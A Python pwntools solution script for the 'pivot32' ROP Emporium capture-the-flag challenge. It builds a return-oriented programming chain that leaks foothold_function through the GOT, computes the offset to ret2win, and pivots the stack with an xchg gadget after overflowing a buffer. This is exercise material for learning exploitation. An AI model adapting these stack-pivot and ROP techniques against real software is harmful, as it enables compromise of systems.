from pwn import *

elf = ELF("pivot32")
libpivot32 = ELF("libpivot32.so")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xc6
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32 + 8
PIVOT_READ_SIZE = 256
SMASH_READ_SIZE = 56

CALL_EAX_GADGET = next(elf.search(asm('call eax')))
XCHG_EAX_ESP_GADGET = elf.symbols.usefulGadgets + 2 # xchg eax, esp; ret
MOV_EAX_PTR_EAX_GADGET = elf.symbols.usefulGadgets + 4 # mov eax, [eax]; ret
ADD_EAX_EBX_GADGET = elf.symbols.usefulGadgets + 7 # add eax, ebx; ret

def main():
    rop = ROP(elf)
    # resolve foothold_function
    rop.call(elf.plt.foothold_function)
    # load foothold_function symbol
    rop(eax=elf.got.foothold_function)
    rop.raw(MOV_EAX_PTR_EAX_GADGET)
    # calculate the difference between ret2win and foothold_function
    rop(ebx=libpivot32.symbols.ret2win - libpivot32.symbols.foothold_function)
    rop.raw(ADD_EAX_EBX_GADGET)
    # reach ret2win
    rop.raw(CALL_EAX_GADGET)
    pivot_payload = rop.chain()
    assert len(pivot_payload) <= PIVOT_READ_SIZE

    c = connection()

    pivot_address = int(c.recvregex(rb'pivot: (.+)\n', capture=True).group(1), 16)
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # fake the stack on the given page
    rop(eax=pivot_address)
    rop.raw(XCHG_EAX_ESP_GADGET)
    smash_payload = rop.chain()
    assert len(smash_payload) <= SMASH_READ_SIZE

    c.sendafter(b'> ', pivot_payload)
    c.sendafter(b'> ', smash_payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
